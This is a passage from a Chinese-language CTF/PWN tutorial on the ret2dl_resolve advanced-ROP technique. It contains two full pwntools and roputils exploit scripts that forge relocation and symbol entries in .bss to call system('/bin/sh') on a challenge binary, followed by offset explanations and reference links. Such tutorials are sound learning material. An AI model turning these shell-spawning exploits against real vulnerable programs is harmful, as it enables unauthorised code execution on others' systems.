    elf = ELF('./pwn')
    io = process('./pwn')
    rop = ROP('./pwn')
    gdb.attach(io)
    pause()
    addr_bss = elf.bss()
    # 这里我们确定bss段+0x800作为我们的可控开始地址 也就是虚假的dynsym表的地址
    stack_size = 0x800
    control_base = addr_bss + stack_size
    # 溢出
    rop.raw('A'*0x2c)
    # call read(0, control_base, 100)
    rop.read(0, control_base, 100)
    rop.migrate(control_base)
    # 将栈迁移到bss段
    io.sendline(rop.chain())
    plt0 = elf.get_section_by_name('.plt').header.sh_addr
    rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
    dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
    dynstr = elf.get_section_by_name('.dynstr').header.sh_addr
    rop2 = ROP('./pwn')
    #伪造一个虚假的dynsym表项的地址
    alarm_got = elf.got['alarm']
    fake_dynsym_addr = control_base + 36
    align = 0x10 - ((fake_dynsym_addr - dynsym) & 0xf)
    fake_dynsym_addr += align
    # 这里要对齐16字节,要不然函数解析的时候会出错,
    index_sym = (fake_dynsym_addr - dynsym) / 0x10
    rel_r_info = index_sym << 8 | 0x7
    fake_rel = p32(alarm_got)+p32(rel_r_info)  # 伪造的rel结构
    st_name= fake_dynsym_addr+0x10-dynstr
    # 取fake_dynsym_addr+0x10 作为'system\x00'的地址,求出偏移付给st_name
    # 伪造.syndym表的表项
    fake_elf32_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)
    rel_plt_offset = control_base + 24 - rel_plt
    # 这里就是我们构造一个很大offset然后让他指向我们的bss段
    binsh = '/bin/sh'
    # 填充结构
    padd = 'B'*4
    # 下面就是往control_base(bss+0x800)写入fake_dynsym表
    # linkmap
    rop2.raw(plt0) # 0
    # offset
    rop2.raw(rel_plt_offset) # 4
    # ret
    rop2.raw(padd) #8
    # binsh位置
    rop2.raw(control_base+90) #12
    rop2.raw(padd) #16
    rop2.raw(padd) #20
    rop2.raw(fake_rel) # 24
    paddoffset = 12
    rop2.raw('B'* paddoffset) # 32
    rop2.raw(fake_elf32_sym) # 44
    # sizeof(fake_dynsym_addr)=0x10 所以下面那个就是system符号
    rop2.raw('system\x00') # 60
    print(len(rop2.chain()))
    rop2.raw('B'*(90 - len(rop2.chain())))
    rop2.raw(binsh+'\x00')
    rop2.raw('B'*(100 - len(rop2.chain())))
    log.success("bss:" + str(hex(addr_bss)))
    log.success("control_base:" + str(hex(control_base)))
    log.success("align:" + str(hex(align)))
    log.success("fake_dynsym_addr - dynsym:" + str(hex(fake_dynsym_addr - dynsym)))
    log.success("fake_dynsym_addr:" + str(hex(fake_dynsym_addr)))
    log.success("binsh:" + str(hex(control_base+82)))
    io.sendline(rop2.chain())
    io.interactive()
这里计算难点是在这里:
    padd = 'B'*4
    # 下面就是往control_base(bss+0x800)写入fake_dynsym表
    # linkmap
    rop2.raw(plt0) # 0
    # offset
    rop2.raw(rel_plt_offset) # 4
    # ret
    rop2.raw(padd) #8
    # binsh位置
    rop2.raw(control_base+90) #12
    rop2.raw(padd) #16
    rop2.raw(padd) #20
    rop2.raw(fake_rel) # 24
    paddoffset = 12
    rop2.raw('B'* paddoffset) # 32
    rop2.raw(fake_elf32_sym) # 44
    # sizeof(fake_dynsym_addr)=0x10 所以下面那个就是system符号
    rop2.raw('system\x00') # 60
首先
    fake_dynsym_addr = control_base + 36
    align = 0x10 - ((fake_dynsym_addr - dynsym) & 0xf)
    fake_dynsym_addr += align
首先我们设置了fake_dynsym_addr是在control_base偏移36处,但是对齐之后+align,那么偏移就是44了
还有就是size(fake_rel)结构大小为8,
paddoffset = 12 其实就是:paddoffset = fake_elf32_sym-control_base-32
    paddoffset = 44 - len(rop2.chain())
    rop2.raw('B'* paddoffset) # 32
    rop2.raw(fake_elf32_sym) # 44
这样也是ok的,填满90,之后设置/bin/sh,就是参数地址了。
###  0x6.2 roputils一把梭
    import sys
    import roputils
    from pwn import *
    context.log_level = 'debug'
    r = process("./pwn")
    # r = remote("c346dfd9093dd09cc714320ffb41ab76.kr-lab.com", "56833")
    rop = roputils.ROP('./pwn')
    addr_bss = rop.section('.bss')
    buf1 = 'A' * 0x2c
    buf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100)
    r.send(buf1)
    buf2 =  rop.string('/bin/sh')
    buf2 += rop.fill(20, buf2)
    buf2 += rop.dl_resolve_data(addr_bss + 20, 'system')
    buf2 += rop.fill(100, buf2)
    r.send(buf2)
    buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss)
    r.send(buf3)
    #gdb.attach(r)
    r.interactive()
这个程序师傅们写的,这里我分析下程序结构
    rop = roputils.ROP('./pwn')
    addr_bss = rop.section('.bss') # 获取bss段地址
    buf1 = 'A' * 0x2c
    buf1 += p32(0x8048390) + p32(0x804852D) + p32(0) + p32(addr_bss) + p32(100)
    r.send(buf1)
    # rop1 这里调用了read的plt,返回地址double overflow,
    # 主要作用是迁移栈到bss段
    # 这段代码可以简化,多利用下rop函数就好了
    # buf = 'A' * 0x2c + rop.call('read', 0, addr_bss, 100)
    buf2 =  rop.string('/bin/sh')
    buf2 += rop.fill(20, buf2)
    buf2 += rop.dl_resolve_data(addr_bss + 20, 'system')
    # addr_bss + 20 这是我们可控的区域,dl_resolve_data会自动对齐
    buf2 += rop.fill(100, buf2)
    r.send(buf2)
    # 上面就是伪造结构的过程,
    buf3 = 'A' * 0x2c + rop.dl_resolve_call(addr_bss + 20, addr_bss)
关于roputils的原理可以参考下: [ROP之return to dl-resolve](http://rk700.github.io/2015/08/09/return-to-dl-resolve/)
## 0x7 总结
本文更多是简化各位大师傅们的文章,因为笔者在学习高级ROP过程中,阅读了各位师傅们的文章之后感觉还是有些地方不是很明白，所以自己集百家之长写了这么一篇自我而言比较好理解的高级ROP文章,当作PWN入门系列栈的收尾,堆开端的预兆。
## 0x8 参考链接
[高级ROP：Ret2dl_resolve技术详解 ](https://www.anquanke.com/post/id/177450)
[高级ROP ret2dl_runtime 之通杀详解](https://xz.aliyun.com/t/5122)
[[原创][新手向]ret2dl-resolve详解](https://bbs.pediy.com/thread-227034.htm)
[baby_pwn wp](https://www.ctfwp.com/articals/2019national.html#babypwn)
[ret2dl_resolve从原理到实践](https://xz.aliyun.com/t/6471)